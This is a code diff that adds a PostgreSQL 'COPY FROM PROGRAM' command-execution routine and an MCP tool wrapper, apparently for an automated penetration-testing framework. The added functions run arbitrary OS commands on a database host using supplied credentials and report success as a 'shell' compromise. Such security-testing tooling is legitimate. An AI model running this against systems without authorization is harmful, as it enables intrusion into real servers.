@@ -198,6 +198,66 @@ async def _postgresql_handler(
         return {"facts": [], "raw_output": f"PostgreSQL connection error: {target}:{port} — {exc}"}
 
 
+async def _postgresql_exec(
+    target: str, username: str, password: str, port: int, timeout: int,
+    command: str = "id",
+) -> dict:
+    """Attempt OS command execution via PostgreSQL COPY ... TO PROGRAM.
+
+    Requires superuser privilege. Falls back to 'whoami' if 'id' returns empty.
+    Returns credential.shell fact on success (triggers compromise gate).
+    """
+    import psycopg2
+    import tempfile
+    import os
+
+    try:
+        conn = psycopg2.connect(
+            host=target, port=port, user=username, password=password,
+            connect_timeout=timeout,
+        )
+        conn.autocommit = True
+        cursor = conn.cursor()
+
+        # Create temp table, use COPY TO PROGRAM to capture output
+        cursor.execute("CREATE TEMP TABLE _athena_exec (line TEXT)")
+        cursor.execute(
+            f"COPY _athena_exec FROM PROGRAM '{command}'"
+        )
+        cursor.execute("SELECT string_agg(line, E'\\n') FROM _athena_exec")
+        row = cursor.fetchone()
+        output = (row[0] or "").strip() if row else ""
+
+        # Fallback: if 'id' returned empty, try 'whoami'
+        if not output and command == "id":
+            cursor.execute("TRUNCATE _athena_exec")
+            cursor.execute("COPY _athena_exec FROM PROGRAM 'whoami'")
+            cursor.execute("SELECT string_agg(line, E'\\n') FROM _athena_exec")
+            row = cursor.fetchone()
+            output = (row[0] or "").strip() if row else ""
+
+        cursor.execute("DROP TABLE IF EXISTS _athena_exec")
+        conn.close()
+
+        if output:
+            return {
+                "facts": [{
+                    "trait": "credential.shell",
+                    "value": f"postgresql_copy_exec:{username}:{password}@{target}:{port} ({output})",
+                }],
+                "raw_output": f"PostgreSQL COPY TO PROGRAM success: {command} → {output}",
+            }
+        return {"facts": [], "raw_output": f"PostgreSQL COPY TO PROGRAM: command returned empty output"}
+
+    except psycopg2.errors.InsufficientPrivilege:
+        return {"facts": [], "raw_output": f"PostgreSQL COPY TO PROGRAM denied: must be superuser"}
+    except psycopg2.OperationalError as exc:
+        msg = str(exc).split("\n")[0]
+        return {"facts": [], "raw_output": f"PostgreSQL exec auth_failure: {username}@{target}:{port} — {msg}"}
+    except Exception as exc:
+        return {"facts": [], "raw_output": f"PostgreSQL exec error: {target}:{port} — {exc}"}
+
+
 @_register("ftp")
 async def _ftp_handler(
     target: str, username: str, password: str, port: int, timeout: int,
@@ -349,6 +409,31 @@ async def ftp_credential_check(
         JSON with facts: credential.ftp if successful, empty if auth fails.
     """
     return json.dumps(await _check_credential("ftp", target, username, password, port, timeout))
+
+
+@mcp.tool()
+async def postgresql_exec_check(
+    target: str, username: str, password: str, port: int = 5432,
+    command: str = "id", timeout: int = 10,
+) -> str:
+    """Test OS command execution via PostgreSQL COPY TO PROGRAM (SPEC-057).
+
+    Requires PostgreSQL superuser privilege. Attempts to execute an OS
+    command through COPY ... FROM PROGRAM. On success, returns a
+    credential.shell fact that triggers the compromise gate.
+
+    Args:
+        target: Target IP address or hostname.
+        username: PostgreSQL username (must be superuser for COPY TO PROGRAM).
+        password: PostgreSQL password.
+        port: PostgreSQL port (default 5432).
+        command: OS command to execute (default 'id').
+        timeout: Connection timeout in seconds.
+
+    Returns:
+        JSON with facts: credential.shell if COPY TO PROGRAM succeeds.
+    """
+    return json.dumps(await _postgresql_exec(target, username, password, port, timeout, command))
 
 
 if __name__ == "__main__":
